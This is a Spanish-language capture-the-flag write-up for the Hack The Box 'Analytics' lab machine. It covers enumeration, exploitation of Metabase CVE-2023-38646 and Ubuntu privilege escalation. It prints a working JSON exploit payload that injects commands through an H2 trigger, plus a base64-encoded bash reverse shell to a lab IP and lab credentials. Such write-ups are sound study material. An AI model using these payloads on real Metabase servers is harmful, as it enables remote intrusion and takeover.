---
description: https://app.hackthebox.com/machines/Analytics
---

# 游릴 HTB - Analytics

<figure><img src="../../.gitbook/assets/Analytics.png" alt=""><figcaption></figcaption></figure>

## Informaci칩n General

* **Nombre de la M치quina:  Analytics**
* **IP de la M치quina:**  10.10.11.233
* **Sistema Operativo: Linux**
* **Dificultad: Easy**
* **Fecha de Publicaci칩n:  07 oct 2023**





***

### **Enumeration**

#### **Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando `settarget` con la direcci칩n IP de la m치quina objetivo:

```bash
settarget 10.10.11.233 Analytics
```

<div data-full-width="true">

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

</div>

#### **Ping de reconocimiento**

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.233 -R
```

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

#### **Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad m칤nima de paquetes y `-vvv` para un nivel de verbosidad alto. Adem치s, utilizamos `-n` para desactivar la resoluci칩n de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.233 -oG allPorts
```

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

#### **Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n `-sCV` para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -p22,80 10.10.11.233 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

```bash
cat targeted -l java
```

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Para a침adir la entrada "10.10.11.233 analytical.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP `10.10.11.233` asociada al nombre de host `analytical.htb` al archivo `/etc/hosts` de tu sistema.

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Para realizar un descubrimiento de directorios en un sitio web utilizando Gobuster, puedes utilizar el siguiente comando:

```bash
gobuster dir -u http://analytical.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Este comando utiliza Gobuster para realizar un escaneo de directorios en el sitio web `http://analytical.htb/`. Utiliza el archivo de palabras `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` como lista de palabras clave para la b칰squeda. La opci칩n `-t 50` indica que se deben utilizar 50 threads simult치neos para acelerar el proceso.

**TIP: Instalaci칩n de SecLists con apt-get**

Para instalar SecLists en sistemas basados en Debian (como Ubuntu) utilizando `apt-get`, puedes seguir estos pasos:

1.  Actualiza la lista de paquetes disponibles:

    ```bash
    sudo apt-get update
    ```
2.  Instala SecLists:

    ```bash
    sudo apt-get install seclists
    ```

Con estos pasos, SecLists se instalar치 en tu sistema y podr치s acceder a la lista de palabras clave en el directorio `/usr/share/seclists/`.

\
Para realizar un descubrimiento de subdominios utilizando Gobuster, puedes utilizar el siguiente comando:

```bash
gobuster dns -d analytical.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20
```

Este comando utiliza Gobuster en modo DNS para buscar subdominios en el dominio analytical`.htb`. Utiliza el archivo de palabras `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` como lista de posibles subdominios. La opci칩n `-t 20` indica que se deben utilizar 20 threads simult치neos para acelerar el proceso.

Navegando en la p치gina de `analytical.htb`, notamos que al intentar acceder al login, este redirecciona a `data.analytical.htb`

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Antes de poder acceder a `data.analytical.htb`, es necesario agregar la siguiente entrada al archivo de hosts de nuestro sistema:

```bash
echo "10.10.11.233 data.analytical.htb" | sudo tee -a /etc/hosts
```

Esta acci칩n nos permite redirigir el tr치fico hacia `data.analytical.htb` correctamente.

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Durante la fase de reconocimiento, descubrimos que Metabase tiene una vulnerabilidad conocida, **#CVE-2023-38646**. Decidimos verificar si `data.analytical.htb` es vulnerable a esta CVE realizando pruebas espec칤ficas para confirmarlo.

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Tras identificar que `data.analytical.htb` podr칤a ser vulnerable al **#CVE-2023-38646,** profundizamos en nuestro an치lisis y descubrimos que el principal problema reside en la exposici칩n indebida del setup token a trav칠s de `/api/session/properties`. Este token, que idealmente no deber칤a estar accesible sin autenticaci칩n, es cr칤tico para la configuraci칩n inicial de Metabase y, por lo tanto, su exposici칩n representa una grave vulnerabilidad de seguridad.

**Extracci칩n del Setup Token**

Realizamos una petici칩n GET a `/api/session/properties` para extraer el setup token, encontrando que, efectivamente, el token est치 disponible:

```bash
curl http://data.analytical.htb/api/session/properties
```

La respuesta incluye el setup token, que no deber칤a estar expuesto. En este caso, el token se parece a `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`.

**Explotaci칩n de la Vulnerabilidad**

Con el setup token en nuestras manos, procedemos a explotar la vulnerabilidad realizando una petici칩n GET a `/api/setup/validate` con el siguiente cuerpo JSON:

```json
{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER payload BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl 10.10.14.80')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
```

Esta consulta utiliza el setup token para realizar una configuraci칩n maliciosa que aprovecha la vulnerabilidad, en este caso, intentando ejecutar un comando que podr칤a, por ejemplo, realizar una petici칩n a un servidor controlado por el atacante. En este caso inyectamos un **CURL**.

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Implementando un Reverse Shell Codificado en Base 64

Despu칠s de confirmar que la inyecci칩n de comandos mediante `curl` fue exitosa, avanzamos un paso m치s en nuestra prueba de concepto, ejecutando un reverse shell. Para ello, optamos por codificar el comando del reverse shell en base 64, lo que nos permite evadir potenciales mecanismos de filtrado de entrada y asegurar la correcta ejecuci칩n del comando en el servidor objetivo.

**Codificaci칩n del Comando en Base 64**

Primero, generamos la cadena en base 64 del comando del reverse shell. Por ejemplo, para un shell Bash, el comando podr칤a ser algo as칤 como:

```bash
sh -i &> /dev/tcp/10.10.14.80/6666 0>&1
```

Lo codificamos en base 64 utilizando una herramienta de l칤nea de comandos. Por ejemplo, en Linux, podr칤as usar:

```bash
echo -n 'sh -i &> /dev/tcp/10.10.14.80/6666 0>&1' | base64
```

Esto generar치 una cadena codificada que se ver치 algo como esto (el resultado real variar치):

```
c2ggLWkgej4gL2Rldi90Y3AvMTAuMTAuMTQuODAvNjY2NiAwPiYx
```

### **Executing Payload**

Con la cadena en base 64 lista, modificamos nuestra petici칩n a `/api/setup/validate` para ejecutar el reverse shell codificado. El comando ejecutado ser칤a una decodificaci칩n y ejecuci칩n del string en base 64, algo as칤 como:

```json
{
    "token": "TOKEN",
    "details": {
        ...
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER payload BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('echo c2ggLWkgej4gL2Rldi90Y3AvMTAuMTAuMTQuODAvNjY2NiAwPiYx | base64 -d | sh')\n$$--=x",
            ...
        },
        ...
    }
}
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante la exploraci칩n del sistema, ejecutamos el comando `ls -la` y encontramos un archivo llamado `.dockerenv`. Este archivo es una se침al clara de que nos encontramos dentro de un contenedor Docker.

Usamos los tips de [shell-en-contenedor-docker.md](../../others/shell-en-contenedor-docker.md "mention")

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al revisar las variables de entorno del contenedor Docker utilizando el comando `env`, logramos extraer las credenciales de acceso. Descubrimos que el usuario es `Metalytics` y la contrase침a es `An4lytics_ds20223#`.

#### Intento de Conexi칩n por SSH con Credenciales Extra칤das

Utilizamos las credenciales de usuario que obtuvimos previamente para intentar conectarnos por SSH al sistema objetivo. Para ello, ejecutamos el siguiente comando desde nuestra m치quina local:

```bash
ssh Metalytics@analytical.htb
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para obtener informaci칩n sobre el sistema operativo del servidor `analytical.htb`, ejecutamos el siguiente comando en la conexi칩n por SSH:

```bash
cat /etc/os-release
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Adem치s hacemos `ls -la` para encontrar la primera flag **user.txt**

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Adem치s de consultar el archivo `/etc/os-release`, ejecutamos el comando `uname -a` para obtener informaci칩n adicional sobre el sistema operativo y el kernel del servidor `analytical.htb`. Este comando nos proporciona detalles espec칤ficos sobre la versi칩n del kernel, la arquitectura del sistema y otra informaci칩n relevante que nos ayuda a comprender mejor el entorno objetivo.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

Durante nuestra investigaci칩n en l칤nea, encontramos un exploit.sh desarrollado por g1vi en su repositorio de GitHub ([https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main)).&#x20;

Yo decid칤 acceder al repositorio y copiar el contenido del exploit y analizarlo con la IA, luego de esto proced칤 a descargarlo desde SSH:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Ejecuci칩n del Exploit para CVE-2023-2640 y CVE-2023-32629

Despu칠s de subir el exploit.sh a la m치quina objetivo, le otorgamos permisos de ejecuci칩n utilizando el comando `chmod +x` y luego ejecutamos el exploit utilizando `./cve-2023-2640.sh`.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>
